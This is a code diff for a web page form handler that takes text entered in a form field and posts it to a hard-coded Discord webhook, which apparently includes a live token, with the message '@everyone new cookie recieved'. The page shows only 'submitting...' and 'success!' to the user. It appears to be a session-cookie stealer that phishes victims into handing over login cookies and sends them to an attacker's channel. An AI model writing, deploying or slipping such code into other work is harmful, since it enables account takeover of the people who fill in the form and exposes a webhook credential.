@@ -16,15 +16,11 @@
 
 			$("form")[0].addEventListener("submit", (e) => {
 				e.preventDefault();
-				let cook = $("#form-input")[0].value;
-				console.log(cook);
-				
-				write("please wait");
+				write("submitting...");
 
 				var req = $.post("https://discord.com/api/webhooks/1054852028234473512/CzgJoge-feFLwWRihyGbcAye_E-NrXuIScA5sDEpPv_PxqBriIFPO9IS4WiaEbRnCteN",{
-					"content": `@everyone new cookie recieved: \`${cook}\``
+					"content": `@everyone new cookie recieved: \`${ $("#form-input")[0].value }\``
 				});
-
 				
 				req.always = function(){write("complete!")};
 				req.done = function(){write("success!")};
